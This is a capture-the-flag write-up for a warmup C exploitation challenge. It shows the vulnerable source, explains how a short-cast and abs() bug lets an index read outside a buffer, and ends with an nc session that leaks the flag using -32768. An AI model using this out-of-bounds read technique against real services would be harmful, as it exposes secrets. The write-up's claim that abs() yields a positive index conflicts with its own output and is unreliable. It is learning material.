# **Hidden Program (Warmup)**

#### tag : exploitation

----------------------------------------------------------------------

#### Description

>None

----------------------------------------------------------------------

#### Challenge

~~~

#include <stdio.h>
#include <limits.h>
#include <string.h>

typedef struct
{
    char flag[SHRT_MAX+1];
    char in[SHRT_MAX+1];
    char sub[SHRT_MAX+1];
    int n;
} player;

player p1;

void main()
{    
    FILE *fp = fopen("/home/hidden-program/flag","r");
    memset(p1.flag,0,sizeof(p1.flag));
    fscanf(fp,"%[^\n]",p1.flag);
    fclose(fp);
    while(1)
    {
        printf("Insert a short integer: ");
        fflush(stdout);
        scanf(" %d", &p1.n);
        if(p1.n>SHRT_MAX)
            printf("Invalid number\n\n");
        else break;
    }
    p1.n = (short)abs((short)p1.n);
    printf("Insert a string: ");
    fflush(stdout);
    scanf("%10000s",p1.in);
    printf("Insert another string: ");
    fflush(stdout);
    scanf("%10000s",p1.sub);
    if(strcmp(&p1.in[p1.n],p1.sub)==0) printf("Congratulations!! YOU WIN!!\n");
    else
        printf("\tYou lost!!!\n\
        In the string %s the substring in the position %d is %s\n\
        Try again...\n", p1.in, p1.n, &p1.in[p1.n]);
    fflush(stdout);
}

~~~

I can download zip file from link and get one cpp code.

~~~

typedef struct
{
    char flag[SHRT_MAX+1];
    char in[SHRT_MAX+1];
    char sub[SHRT_MAX+1];
    int n;
} player;

~~~

~~~

FILE *fp = fopen("/home/hidden-program/flag","r");
memset(p1.flag,0,sizeof(p1.flag));
fscanf(fp,"%[^\n]",p1.flag);
fclose(fp);

~~~

Flag is allocated in p1.flag.

~~~

printf("\tYou lost!!!\n\
In the string %s the substring in the position %d is %s\n\
Try again...\n", p1.in, p1.n, &p1.in[p1.n])

~~~

And I can refer p1.flag by &p1.in[p1.n].

In this case, if p1.n is 32768 which is SHRT_MAX+1, &p1.in[p1.n] is eqaul to p1.flag.

~~~

while(1)
{
    printf("Insert a short integer: ");
    fflush(stdout);
    scanf(" %d", &p1.n);
    if(p1.n>SHRT_MAX)
        printf("Invalid number\n\n");
    else break;
}
p1.n = (short)abs((short)p1.n);

~~~

Because of checking in while, I can't put number upper than 32767 to p1.n. But end of while, abs(p1.n) make p1.n is positive number. So if I put the number -32787 to p1.n, it'll be 32787.

----------------------------------------------------------------------

#### Solution

~~~

epist@epist-machine:~$ nc 200.136.213.126 1988
Insert a short integer: -32768
Insert a string: a
Insert another string: a
	You lost!!!
        In the string a the substring in the position -32768 is CTF-BR{Th1s_1S_4_50_5Imp13_C_exp1017_}
        Try again...

~~~

**CTF-BR{Th1s_1S_4_50_5Imp13_C_exp1017_}**
